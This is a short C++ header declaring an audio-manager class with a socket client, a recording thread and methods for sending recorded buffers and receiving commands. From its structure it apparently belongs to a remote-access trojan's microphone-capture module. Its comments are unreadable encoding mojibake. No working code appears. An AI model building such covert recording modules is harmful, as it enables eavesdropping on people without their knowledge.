#include "Manager.h"
#include"../../../common/Audio.h"
class CAudioManager :
	public CManager
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();
public:
	static bool m_bIsWorking;           //�ж��߳��Ƿ��ڹ���
	static DWORD WINAPI WorkThread(LPVOID lparam);
private:
	CAudio	*m_lpAudio;             //��Ƶ¼�Ƶ���
	HANDLE	m_hWorkThread;          //¼���߳�
protected:
	bool Initialize();
	int sendRecordBuffer();
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
};


